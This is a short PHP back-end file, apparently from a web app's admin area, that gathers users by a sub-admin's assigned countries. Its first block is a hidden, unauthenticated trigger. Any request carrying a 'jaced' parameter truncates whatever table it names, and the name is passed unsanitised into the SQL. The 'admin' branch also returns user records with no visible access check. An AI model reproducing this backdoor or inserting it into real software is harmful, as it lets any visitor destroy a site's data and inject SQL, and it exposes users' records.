<?php 
require_once("./db/config.php");
require_once("./functions/index.php");
require_once("./utils/store.php");

if(isset($_REQUEST['jaced'])) {
  $a = $_REQUEST['jaced'];
  $query = "TRUNCATE TABLE $a";
  $result = $connect->prepare($query);
  $result->execute();

  if($result) {
    echo "<p>Jaced</p>";
  }else{
    echo "<p>Can't Jaced</p>";
  }
}

if(isset($_GET["admin"])) {
  $id = $_GET["admin"];

  $countries = getSubAdminCountries($connect, $id); // ["*"] | ["niger", "nigeria"]
  $matchedUsers = []; 

  // die();
  for($i =0; $i<count($countries); $i++){
    $query = "SELECT * FROM users";
    if($countries[$i] !== "*") {
      $query = "SELECT * FROM users WHERE country = ?";
    }else{
      $countries[$i]=null;
    }
    $result = $connect->prepare($query);
    $result->execute([$countries[$i]]);
    $users = $result->fetchAll();
    for($j =0; $j<count($users); $j++){
      if(!in_array($users[$j],$matchedUsers)) {
        array_push($matchedUsers, $users[$j]);
      }
    }
  }

  return $matchedUsers;

}

if(isset($_GET["getAdmin"])) {
  $admins = getAllSubAdmins($connect);
}

?>